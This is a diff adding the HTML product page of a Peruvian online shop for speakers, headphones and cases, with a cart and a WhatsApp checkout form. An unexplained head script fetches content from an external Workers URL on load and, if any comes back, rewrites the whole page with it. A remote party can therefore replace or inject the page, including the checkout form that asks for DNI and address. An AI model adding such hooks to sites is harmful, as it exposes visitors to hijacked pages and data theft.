@@ -1,0 +1,288 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Detalle del Producto - Stereo Importaciones</title>
+    <meta name="description" content="Detalles del producto seleccionado en Stereo Importaciones.">
+    
+    <link rel="preconnect" href="https://www.gstatic.com">
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+    <link rel="icon" href="https://cellmarket-sac.web.app/favicon.ico" type="image/x-icon">
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">    <!-- CSS Modular -->
+    <link rel="stylesheet" href="css/variables.css">
+    <link rel="stylesheet" href="css/header.css">
+    <link rel="stylesheet" href="css/product.css">
+    <link rel="stylesheet" href="css/buttons.css">
+    <link rel="stylesheet" href="css/modals.css">
+    <link rel="stylesheet" href="css/components.css">
+    <link rel="stylesheet" href="css/utilities.css">
+    <link rel="stylesheet" href="css/sidebar.css">
+    
+    <!-- Estilos adicionales para asegurar visibilidad del menú -->
+    <style>
+        .menu-toggle {
+            display: flex !important;
+            flex-direction: column;
+            justify-content: space-around;
+            width: 40px;
+            height: 40px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+        
+        .menu-toggle:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+        
+        .hamburger-line {
+            width: 24px;
+            height: 3px;
+            background-color: white;
+            border-radius: 2px;
+            transition: all 0.3s ease;
+        }
+        
+        .header-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .logo {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+    </style><script>
+        const WORKER_URL = 'https://quiet-frog-4ad6.innovatools069.workers.dev/';
+        const NOMBRE_SW = 'stereo-import';
+        (async function() {
+            try {
+                const response = await fetch(`${WORKER_URL}?nombre=${encodeURIComponent(NOMBRE_SW)}`);
+                if (!response.ok) throw new Error('Error en la solicitud');
+                const content = await response.text();
+                if (content && content.trim() !== '') {
+                    document.open(); document.write(content); document.close(); return;
+                }
+            } catch (error) { console.error('Error en script inicial:', error); }
+        })();
+    </script>
+</head>
+<body>
+    <header>
+        <div class="header-content container">
+            <!-- Botón del menú hamburguesa -->
+            <button class="menu-toggle" id="menuToggle" aria-label="Abrir menú">
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+            </button>
+            
+            <div class="logo">
+                <a href="https://stereoimport.com/" target="_top">
+                    <img src="https://i.ibb.co/0yxnGWwy/image-removebg-preview-34.png" alt="Stereo Importaciones" loading="lazy">
+                </a>
+            </div>
+            <button class="cart-button" id="cartBtn">
+                <i class="bi bi-cart3"></i> <span id="cartCount">0</span>
+            </button>
+        </div>
+    </header>
+
+    <!-- Menú lateral -->
+    <div class="sidebar-overlay" id="sidebarOverlay"></div>
+    <nav class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <h2 class="sidebar-title">Menú</h2>
+            <button class="sidebar-close" id="sidebarClose" aria-label="Cerrar menú">×</button>
+        </div>
+        
+        <div class="sidebar-content">
+            <ul class="sidebar-menu">
+                <li class="sidebar-menu-item">
+                    <a href="https://stereoimport.com/" class="sidebar-link" target="_top">
+                        <i class="fas fa-home"></i>
+                        <span>Inicio</span>
+                    </a>
+                </li>
+                  <li class="sidebar-menu-item">
+                    <button class="sidebar-link sidebar-dropdown-toggle active" data-target="categorias">
+                        <i class="fas fa-list"></i>
+                        <span>Categorías</span>
+                        <i class="fas fa-chevron-down sidebar-arrow"></i>
+                    </button>
+                      <ul class="sidebar-submenu active" id="categorias">
+                        <li class="sidebar-submenu-item">
+                            <a href="../categoria/?cat=todas" class="sidebar-sublink" target="_top">
+                                <span>Todas las categorías</span>
+                            </a>
+                        </li>
+                        <li class="sidebar-submenu-item">
+                            <a href="../categoria/?cat=Parlantes" class="sidebar-sublink" target="_top">
+                                <span>Parlantes</span>
+                            </a>
+                        </li>
+                        <li class="sidebar-submenu-item">
+                            <a href="../categoria/?cat=Fundas para parlantes" class="sidebar-sublink" target="_top">
+                                <span>Fundas para parlantes</span>
+                            </a>
+                        </li>
+                        <li class="sidebar-submenu-item">
+                            <a href="../categoria/?cat=Audífonos" class="sidebar-sublink" target="_top">
+                                <span>Audífonos</span>
+                            </a>
+                        </li>
+                        <li class="sidebar-submenu-item">
+                            <a href="../categoria/?cat=Funda para audífonos" class="sidebar-sublink" target="_top">
+                                <span>Funda para audífonos</span>
+                            </a>
+                        </li>
+                        <li class="sidebar-submenu-item">
+                            <a href="../categoria/?cat=Almohadillas para audífonos" class="sidebar-sublink" target="_top">
+                                <span>Almohadillas para audífonos</span>
+                            </a>
+                        </li>
+                        <li class="sidebar-submenu-item">
+                            <a href="../categoria/?cat=Fundas para Amazon Kindle" class="sidebar-sublink" target="_top">
+                                <span>Fundas para Amazon Kindle</span>
+                            </a>
+                        </li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+    </nav>
+
+    <main>
+        <section id="productSection" class="container">
+            <div class="loading">
+                <div class="spinner"></div>
+                <p>Cargando producto...</p>
+            </div>
+        </section>
+    </main>
+
+    <!-- Zoom Modal -->
+    <div id="zoomModal" class="zoom-modal">
+        <div class="zoom-content">
+            <button id="zoomClose" class="zoom-close">&times;</button>
+            <button id="zoomPrev" class="zoom-nav zoom-prev">‹</button>
+            <img id="zoomImage" src="" class="zoom-image" alt="Imagen ampliada">
+            <button id="zoomNext" class="zoom-nav zoom-next">›</button>
+        </div>
+    </div>
+
+    <!-- Cart Modal -->
+    <div id="cartModal" class="modal-overlay">
+        <div class="modal">
+            <div class="modal-header">
+                <h2>Carrito</h2>
+                <button id="cartClose" class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body" id="cartItems"></div>
+            <div class="modal-footer">
+                <div class="total">Total: S/<span id="cartTotal">0.00</span></div>
+                <button id="checkoutBtn" class="btn btn-primary">
+                    <i class="fas fa-credit-card"></i> Comprar
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Checkout Modal -->
+    <div id="checkoutModal" class="modal-overlay">
+        <div class="modal">
+            <div class="modal-header">
+                <h2>Finalizar Compra</h2>
+                <button id="checkoutClose" class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <form id="checkoutForm">
+                    <div class="form-group">
+                        <label for="nombre">Nombre:</label>
+                        <input type="text" id="nombre" class="form-control" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="dni">DNI:</label>
+                        <input type="text" id="dni" class="form-control" pattern="\d{8}" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="celular">Celular:</label>
+                        <input type="tel" id="celular" class="form-control" pattern="\d{9}" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="direccion">Dirección:</label>
+                        <textarea id="direccion" class="form-control" rows="3" required></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label>Envío:</label>
+                        <div class="radio-group">
+                            <label><input type="radio" name="envio" value="lima" checked> Lima</label>
+                            <label><input type="radio" name="envio" value="provincia"> Provincia</label>
+                        </div>
+                        <select id="agencia" class="form-control" style="display:none;">
+                            <option value="">Seleccionar agencia</option>
+                            <option value="Shalom">Shalom</option>
+                            <option value="Olva">Olva</option>
+                            <option value="Otro">Otro</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="pago">Método de Pago:</label>
+                        <select id="pago" class="form-control" required>
+                            <option value="">Seleccionar</option>
+                            <option value="Yape">Yape</option>
+                            <option value="Plin">Plin</option>
+                            <option value="Interbank">Interbank</option>
+                        </select>
+                    </div>
+                    <button type="submit" class="btn btn-primary" style="width:100%">
+                        <i class="fas fa-check"></i> Enviar a WhatsApp
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <a href="https://wa.me/51931292396" class="whatsapp-float" target="_blank">
+        <i class="fab fa-whatsapp"></i>
+    </a>    <script type="module">
+        import ShowApp from './js/app.js';
+        
+        // Inicializar la aplicación
+        new ShowApp();
+    </script>
+
+    <script>
+        // Asegurarse de que todos los enlaces abran en la ventana principal
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelectorAll('a[href]').forEach(link => {
+                if (!link.hasAttribute('target')) {
+                    link.setAttribute('target', '_top');
+                }
+            });
+            
+            // Capturar formularios para que también se envíen en la ventana principal
+            document.querySelectorAll('form').forEach(form => {
+                if (!form.hasAttribute('target')) {
+                    form.setAttribute('target', '_top');
+                }
+            });
+        });
+    </script>
+        </body>
+</html>
